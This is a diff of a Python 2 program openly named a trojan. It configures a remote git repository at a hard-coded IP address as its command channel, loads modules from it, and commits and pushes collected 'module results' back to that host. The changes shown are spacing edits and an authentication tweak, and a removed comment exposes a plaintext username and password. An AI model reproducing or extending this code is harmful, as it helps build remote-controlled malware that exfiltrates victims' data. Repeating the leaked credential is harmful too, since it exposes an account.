@@ -9,18 +9,19 @@ import Queue
 import os
 
 from gittle import Gittle
+from gittle import GittleAuth
 
 repo_path = '/tmp/gittle_bare'
 #repo_url = 'ssh://115.159.57.117:29418/Trojan'
 repo_url = "http://115.159.57.117:8081/Trojan"
 trojan_id = "abc"
 
-trojan_config = "%s.json" % trojan_id
-data_path	  = "data/%s/" % trojan_id
-trojan_modules = []
-configured		= False
-task_queue		= Queue.Queue()
-repo			= None
+trojan_config	 = "%s.json" % trojan_id
+data_path		 = "data/%s/" % trojan_id
+trojan_modules	 = []
+configured		 = False
+task_queue		 = Queue.Queue()
+repo			 = None
 
 class Gitimporter(object):
 	def __init__(self):
@@ -107,7 +108,8 @@ def store_module_result(data):
 	repo.commit(name = "ratel", email = "ratel@friedco.de", message = "new \
 		   	data commit")
 
-#repo.auth(username = "Dennis", password = "apple@511126")
+	repo.auth("Dennis")
+#repo.auth(username = "Dennis")
 
 	repo.push()
 
